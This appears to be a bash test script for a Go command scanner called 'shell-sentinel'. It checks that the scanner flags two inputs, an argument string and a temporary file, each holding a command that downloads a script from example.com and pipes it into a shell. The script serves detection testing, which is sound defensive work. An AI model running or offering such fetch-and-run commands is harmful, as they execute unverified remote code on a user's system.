#!/usr/bin/env bash
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "${repo_root}"

payload='bash -c "$(curl -fsSL https://example.com/install.sh)"'
report="$(mktemp)"

set +e
go run ./cmd/shell-sentinel --json --fail-on warn "${payload}" >"${report}"
status=$?
set -e

echo "[input mode] exit status: ${status}"
jq -r '.findings[] | [.severity, .kind, .message] | @tsv' "${report}"

tmp_script="$(mktemp "${TMPDIR:-/tmp}/shell-sentinel.XXXXXX.sh")"
cat >"${tmp_script}" <<'EOF'
curl https://example.com/install.sh | sh
EOF

set +e
go run ./cmd/shell-sentinel --json --fail-on warn --file "${tmp_script}" >"${report}"
file_status=$?
set -e

echo "[file mode] exit status: ${file_status}"
jq -r '.findings[] | [.severity, .kind, .message, (.line // 0)] | @tsv' "${report}"

echo "expected: non-zero status with warning/error annotations from action parser"
